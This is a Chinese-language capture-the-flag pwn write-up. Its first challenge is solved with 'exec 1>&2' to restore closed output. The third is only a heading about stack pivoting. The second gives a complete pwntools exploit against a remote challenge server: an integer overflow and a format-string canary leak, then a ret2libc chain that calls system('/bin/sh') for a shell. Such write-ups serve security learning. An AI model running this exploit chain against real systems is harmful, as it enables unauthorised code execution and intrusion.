
### 第一题

#### 考点：文件描述符，close(1)关闭了文件输出，close(2)关闭了文件错误输出

因为关闭了文件显示但是存在系统调用函数。
直接输入exec 1>&2就行
![[Pasted image 20240910232807.png]]

![[Pasted image 20240910232816.png]]

### 第二题

#### 考点：考察的canary泄露和有符号转无符号导致的整数溢出（ int (-1) --> unsigned int(1) ）

#### 附件：

![[Pasted image 20240923211731.png]]
![[Pasted image 20240923211745.png]]
主函数是第一张图，第二张是get_n的函数，这个函数的作用是输入字符串，atoi函数是将字符串转化为整数，溢出在第二个get_n函数，如果v1是-1的话，v1在主函数声明的是int，但是在get_n的函数里面的是声明的unsigned int，强制转换-1为unsigned int会变成非常大的数。

第三张图里面是一个格式化字符串漏洞。用来泄露canary。

思路是：利用输入的是-1造成整数溢出。然后在泄露canary，然后构造rop泄露基地址，最后调用system。

##### !!!疑问

在构建exp的时候我遇到了一些问题，在发送‘-999’的时候，如果围我用是send()那么我接收不到gift,用的是sendline()的话那就可以得到。

![[Pasted image 20240923211833.png]]

在发送‘|%7$p’的时候，如果围我用是send()那么我接收不到canary,用的是sendline()的话那就可以得到。
![[Pasted image 20240923211757.png]]

还有就是主函数里面的输入函数只有3个，getchar()函数是用来处理换行符的，不是输入的。

atoi函数是将字符串转化为整数（int）的函数。

![[Pasted image 20240923211807.png]]

我在接收泄露的真实地址的时候发现一直接收的是同一个地址，发现不对。经过与exp  
对比后发现是自己粗心，没有将程序中的输出的字符串接收。所以才导致一直是接受的是同一个地址。

只需要在sendline的后面加上recvline就可以将输出的字符串接收就行。然后就发现就可以打通了。


![[Pasted image 20240923211846.png]]


```
from pwn import*
from LibcSearcher import *
p=remote("hnctf.yuanshen.life",34702)
# p=process('./idea')
libc=ELF('./idea')
context(os='linux', arch='i386', log_level='debug')
main=libc.sym['main']
put_plt=libc.plt['puts']
main_got=libc.got['__libc_start_main']
p.recvuntil(b"read? ")
pay=b'-9'
p.sendline(pay)
pay=b"|%7$p"
p.recvuntil(b"gift!\n")
p.sendline(pay)
p.recvuntil(b'|')
canary=int(p.recv(10),16)
print(hex(canary))
pay=flat(b'a'*(0x20),p32(canary),b'a' * 0xc,p32(put_plt),p32(main),p32(main_got))
p.recvuntil(b"data!\n")
p.sendline(pay)

p.recvline()

main_addr=u32(p.recv(4))
Libc = LibcSearcher("__libc_start_main",main_addr)
log.success('leak_atoi_real_addr => {}'.format(hex(main_addr)))

libcbase = main_addr - Libc.dump('__libc_start_main')
system_addr = libcbase + Libc.dump('system')
str_bin_sh = libcbase + Libc.dump('str_bin_sh')

p.recvuntil(b"read? ")
pay=b'-9'
p.sendline(pay)
pay=b"|%7$p"
p.recvuntil(b"gift!\n")
p.sendline(pay)
p.recvuntil(b"data!\n")
pay=flat(b'a'*(0x20),p32(canary),b'a' * 0xc,p32(system_addr),p32(0),p32(str_bin_sh))
p.sendline(pay)
p.interactive()
```



### 第三题

#### 考点：栈溢出至rbp，然后靠函数退出的leave;retn进行栈迁移

#### 附件：
![[pwn1]]


